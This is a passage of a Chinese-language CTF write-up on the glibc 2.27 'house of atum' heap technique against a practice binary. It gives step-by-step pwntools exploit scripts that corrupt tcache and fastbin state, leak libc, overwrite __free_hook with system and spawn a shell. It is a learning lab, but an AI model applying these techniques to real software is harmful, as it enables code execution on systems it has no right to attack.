src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194449782.png" alt="image-20250326194449782"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194935684.png" alt="image-20250326194935684"></p><ul><li>并且此时我们发现，我们之前写入的<code>0x11</code>还保留在对应的堆块中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195020891.png" alt="image-20250326195020891"></p><ul><li>这时我们就可以进行<code>house of atum</code>的利用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br></pre></td></tr></table></figure><ul><li>先申请一个堆块，将这个堆块的<code>fd</code>指针修改为<code>chunk_addr = chunk_addr -0x10 - 0x20 </code>，也就是这个位置</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195231451.png" alt="image-20250326195231451"></p><ul><li>然后我们再申请一个堆块，这个堆块的内容随便填一下，这样我们就可以得到如下的<code>bins</code>，我们会发现<code>0x*****240</code>即上图中对应红框框起来的下面一个位置，已经被放入到了<code>tcachebin</code>中。</li><li>但是此时我们的<code>idx=0</code>和<code>idx=1</code>都有堆块存放了，所以我们这时需要释放一个堆块，才能将放入<code>tcachebin</code>中的堆块给申请回来。而释放<code>idx=0</code>或者<code>idx=1</code>其中一个都没什么问题，他们指向的都是<code>0x******260</code>，并且存放<code>0x50</code>大小的堆块对应的<code>tcachebin</code>已经存满<code>7</code>块了，所以我们释放这两个堆块的其中一个，都会被放入<code>fastbin</code>中。我们选择释放掉<code>idx=1</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195531366.png" alt="image-20250326195531366"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326200336719.png" alt="image-20250326200336719"></p><ul><li>释放完<code>idx=1</code>后，我们就可以将对应的<code>0x******240</code>这个堆块给申请回来，并且就可以从<code>0x******240</code>开始往里面写数据，在写数据的时候可以覆盖到原来我们堆块的<code>prev_size</code>和<code>size</code>位。这时我们就可以保持<code>prev_size=0x0</code>并且<code>size=0x91</code>为我们后续触发<code>unlink</code>操作做准备。我们计算<code>0x91</code>这个位置，刚好就是下图所示的范围。</li><li>此时我们<code>idx=1</code>指向的地址为<code>0x*****240</code>，<code>idx=0</code>指向的地址为<code>0x********260</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326200915924.png" alt="image-20250326200915924"></p><ul><li>接下来我们就要实现在<code>tcachebin</code>下的如何触发<code>unlink</code></li><li>首先我们需要让<code>tcachebin</code>对应的位置存满<code>7</code>个堆块，然后我们第<code>8</code>次释放后就会放入<code>fastbin</code>中，并且查看是否能合并，如果能和其他相邻的堆块合并，就会进行合并操作，合并后的堆块就会被放入<code>unsortedbin</code>这个堆块中。所有我们就要释放<code>idx=0</code>对应的堆块<code>8</code>次</li><li>这里还要注意下，在第<code>8</code>次释放的时候，我们要将<code>notes[0]</code>中的数据设置为<code>0</code>。这样我们之后才能申请堆块。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>我们来查看效果，<code>unlink</code>后的<code>bins</code>和堆内存。我们发现图中的堆块已经成功被触发了<code>unlink</code>操作。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326201753407.png" alt="image-20250326201753407"></p><ul><li>并且我们发现放入<code>unsortedbin</code>中的堆块，<code>fd</code>、<code>bk</code>对应的值为<code>main_arena+96</code>的位置，由于<code>notes[0]</code>处的元素已经被设置为<code>0</code>了这时我们就可以使用<code>show(1)</code>来泄露堆块</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326201944561.png" alt="image-20250326201944561"></p><ul><li>接下来就是泄露操作了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(leak,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">96</span> -<span class="number">0x10</span> -libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys_addr = libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><ul><li>但是在进行<code>show(1)</code>操作时，我们还要对<code>idx=1</code>处的堆块进行编辑。因为<code>0x*****240</code>这边都是空字节，在使用<code>puts</code>函数输出时，并不会将<code>main_arena+96</code>这个地址给泄露出来。所以我们要先填充<code>b'a'*0x20</code>，再调用<code>show(1)</code>进行地址的泄露。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202137118.png" alt="image-20250326202137118"></p><ul><li>并且泄露之后我们还需要将对应地址<code>0x****260</code>的<code>prev_size</code>、<code>size</code>复原，要不然在下次申请的时候会程序就会报错。</li><li>泄露的结果如下：</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202717422.png" alt="image-20250326202717422"></p><ul><li>接下来我们就要对<code>unsortedbin</code>这个运行进制进行利用了，我们先来看看目前<code>bins</code>的布局</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202809125.png" alt="image-20250326202809125"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326204013421.png" alt="image-20250326204013421"></p><ul><li>此时利用的是<code>tcachebin_UAF然后申请到任意地址</code>，我们已经泄露了<code>libc</code>的地址，这时我们就可以劫持<code>hook</code>从而<code>getshell</code>，这里我们选择劫持<code>__free_hook</code>这个函数指针为<code>system('/bin/sh')</code>。所以我们先要将堆块申请到<code>__free_hook</code>这个位置。</li><li>并且由于<code>tcachebins</code>在取出堆块的时候并没有对<code>chunk</code>的<code>size</code>位做检测，所以并不要寻找合适的<code>size</code>对应的内存进行申请，直接申请<code>__free_hook-0x20</code>这个位置即可。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326204959390.png" alt="image-20250326204959390"></p><ul><li>这时我们还需要修改已经被放入<code>tcachbin</code>中的<code>size</code>位为<code>0x51</code>，这样我们申请的时候就可以申请到处于<code>0x*****260</code>处的堆块。</li><li>并且我们还要修改<code>fd</code>的值为<code>free_hook-0x20</code>，这样在申请完<code>0x*******260</code>这个堆块的时候<code>free_hook-0x20</code>这个地址就会被链到<code>tcachebin</code>上,具体效果如下：</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326205742872.png" alt="image-20250326205742872"></p><ul><li>但是此时<code>idx=0</code>和<code>idx=1</code>都已经有堆块了，所以我们申请到<code>0x******260</code>这个堆块后，又要将其释放。但是该堆块会被放入<code>fasbin</code>中，所以我们下次申请时就会申请到<code>__free_hook-0x20</code>这个位置，接下来将<code>/bin/sh</code>先写入到<code>free_hook-0x10</code>的位置，然后将<code>system_addr</code>填入<code>__free_hook</code>中。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#payload = p64(free_hook-0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sys_addr)</span><br><span class="line">add(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326210646490.png" alt="image-20250326210646490"></p><ul><li>填入之后再使用<code>free</code>调用释放这个堆块，这时<code>free(0x7fcd558de8d8)</code>，就相当于执行<code>system(&quot;/bin/sh&quot;)</code>，<code>0x7fcd558de8d8</code>这个内存地址中存储的就是<code>/bin/sh\x00</code>这个字符串。这样就能取得<code>shell</code>了</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326211104707.png" alt="image-20250326211104707"></p><h2 id="level_1_exp"><a class="markdownIt-Anchor" href="#level_1_exp"></a> level_1_exp</h2><ul><li>具体的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 